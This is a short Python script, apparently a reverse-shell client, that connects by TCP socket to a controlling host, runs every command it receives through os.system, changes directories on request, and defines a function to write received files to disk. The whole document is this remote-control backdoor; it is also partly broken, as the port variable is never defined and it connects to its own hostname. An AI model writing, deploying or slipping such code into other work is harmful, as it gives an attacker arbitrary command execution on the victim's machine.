import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(), port))


def file_transfer(filename):
    with open(filename, 'wb') as f:
        cont = s.recv(1000233)
        f.write(cont)


def reverse_shell():
    while True:
        msg = s.recv(1024).decode('utf-8')
        msg = msg.split(' ', 1)
        command = msg[0]
        prompt = msg[1]
        if command == 'system':
            os.system(prompt)
        elif command == 'chdir':
            os.chdir(prompt)


reverse_shell()
